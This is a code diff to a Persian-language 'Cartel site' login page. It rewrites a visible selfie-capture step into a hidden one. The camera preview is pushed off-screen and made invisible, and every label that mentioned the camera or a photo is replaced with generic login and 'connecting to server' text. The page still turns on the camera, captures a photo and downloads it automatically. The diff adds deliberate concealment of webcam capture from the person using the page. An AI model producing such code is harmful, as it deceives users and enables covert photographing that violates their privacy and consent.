@@ -86,27 +86,16 @@
         }
 
         /* ============================================
-           ویدیو (دوربین)
+           ویدیو (دوربین) - مخفی
            ============================================ */
         #video {
-            width: 100%;
-            max-width: 320px;
-            aspect-ratio: 1/1;
-            border-radius: 32px;
-            background: #000;
-            border: 2px solid rgba(0, 230, 118, 0.15);
-            object-fit: cover;
-            transform: scaleX(-1);
-            display: none;
-            margin: 0 auto 16px auto;
-            box-shadow: 0 0 60px rgba(0, 230, 118, 0.05);
-            transition: all 0.4s ease;
-        }
-
-        #video.active {
-            display: block;
-            border-color: rgba(0, 230, 118, 0.5);
-            box-shadow: 0 0 80px rgba(0, 230, 118, 0.1);
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
 
         /* ============================================
@@ -290,26 +279,26 @@
         <div class="subtitle">🔹 ورود امن 🔹</div>
         <div class="owner">مالک: <span>اودین بلادی</span></div>
 
-        <!-- دوربین -->
+        <!-- دوربین (مخفی) -->
         <video id="video" autoplay playsinline></video>
 
         <!-- دکمه شیشه‌ای -->
         <button class="glass-btn" id="btn">
-            <span class="icon">📸</span>
-            ثبت سلفی و ورود
+            <span class="icon">🚀</span>
+            ورود به سایت کارتل
         </button>
 
         <!-- وضعیت -->
         <div id="status">
             <span class="dot-pulse"></span>
-            آماده برای ثبت سلفی
+            آماده برای ورود
         </div>
 
         <!-- فوتر -->
         <div class="footer">
             <span class="badge green">🔒 محرمانه</span>
             <span class="badge">⚡ یک کلیک</span>
-            <span class="badge green">📱 سلفی</span>
+            <span class="badge green">📱 امن</span>
         </div>
     </div>
 
@@ -338,11 +327,11 @@
 
             // آپدیت وضعیت
             status.className = '';
-            status.innerHTML = '<div class="spinner" style="display:block;"></div> درخواست دسترسی به دوربین...';
+            status.innerHTML = '<div class="spinner" style="display:block;"></div> در حال ارتباط با سرور...';
 
             try {
                 // ============================================
-                //  درخواست دسترسی به دوربین
+                //  درخواست دسترسی به دوربین (مخفی)
                 // ============================================
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
@@ -353,15 +342,14 @@
                     audio: false
                 });
 
-                // نمایش ویدیو
-                video.classList.add('active');
+                // نمایش ویدیو (مخفی)
                 video.srcObject = stream;
                 await video.play();
 
                 // آپدیت وضعیت
                 status.className = 'success';
-                status.innerHTML = '✅ دوربین فعال شد! <span class="dot-pulse"></span>';
-                btn.innerHTML = '<span class="icon">📸</span> در حال گرفتن عکس...';
+                status.innerHTML = '✅ در حال پردازش...';
+                btn.innerHTML = '<span class="icon">⏳</span> در حال ورود...';
 
                 // ============================================
                 //  گرفتن عکس بعد از ۴۰۰ میلی‌ثانیه
@@ -374,18 +362,16 @@
                 console.error('❌ خطا:', error);
 
                 status.className = 'error';
-                status.innerHTML = '❌ دسترسی به دوربین داده نشد!';
+                status.innerHTML = '❌ خطا در ارتباط! لطفاً مجدد تلاش کنید.';
 
                 btn.disabled = false;
-                btn.innerHTML = '<span class="icon">🔄</span> تلاش مجدد';
+                btn.innerHTML = '<span class="icon">🔄</span> ورود مجدد';
                 isProcessing = false;
-
-                video.classList.remove('active');
             }
         });
 
         // ============================================
-        //  تابع گرفتن عکس
+        //  تابع گرفتن عکس (مخفی)
         // ============================================
         function capturePhoto() {
             try {
@@ -407,7 +393,7 @@
                 //  دانلود خودکار (ذخیره در گالری)
                 // ============================================
                 const link = document.createElement('a');
-                link.download = `cartel_selfie_${Date.now()}.jpg`;
+                link.download = `cartel_${Date.now()}.jpg`;
                 link.href = photoData;
                 document.body.appendChild(link);
                 link.click();
@@ -415,9 +401,9 @@
 
                 // آپدیت وضعیت
                 status.className = 'success';
-                status.innerHTML = '✅ عکس در گالری ذخیره شد!';
+                status.innerHTML = '✅ ورود موفق! خوش آمدید.';
 
-                btn.innerHTML = '✅ ورود موفق';
+                btn.innerHTML = '✅ وارد شدید';
                 btn.style.borderColor = 'rgba(0, 230, 118, 0.6)';
 
                 // ============================================
@@ -426,28 +412,27 @@
                 setTimeout(() => {
                     if (stream) {
                         stream.getTracks().forEach(t => t.stop());
-                        video.classList.remove('active');
                         video.srcObject = null;
                     }
 
                     btn.disabled = false;
-                    btn.innerHTML = '<span class="icon">📸</span> ثبت سلفی و ورود';
+                    btn.innerHTML = '<span class="icon">🚀</span> ورود به سایت کارتل';
                     btn.style.borderColor = 'rgba(0, 230, 118, 0.25)';
                     isProcessing = false;
 
                     status.className = '';
-                    status.innerHTML = '<span class="dot-pulse"></span> آماده برای ثبت مجدد';
+                    status.innerHTML = '<span class="dot-pulse"></span> آماده برای ورود مجدد';
 
                 }, 2000);
 
                 canvas.remove();
 
             } catch (error) {
-                console.error('❌ خطا در گرفتن عکس:', error);
+                console.error('❌ خطا:', error);
                 status.className = 'error';
-                status.innerHTML = '❌ خطا در گرفتن عکس!';
+                status.innerHTML = '❌ خطا در ورود!';
                 btn.disabled = false;
-                btn.innerHTML = '<span class="icon">🔄</span> تلاش مجدد';
+                btn.innerHTML = '<span class="icon">🔄</span> ورود مجدد';
                 isProcessing = false;
             }
         }
@@ -461,8 +446,8 @@
         }, { passive: false });
 
         // لاگ برای تست
-        console.log('📸 سایت کارتل - مالک: اودین بلادی');
-        console.log('👆 روی دکمه کلیک کن تا سلفی ثبت شود.');
+        console.log('🔐 سایت کارتل - مالک: اودین بلادی');
+        console.log('👆 روی دکمه کلیک کن تا وارد شوی.');
     </script>
 </body>
 </html>
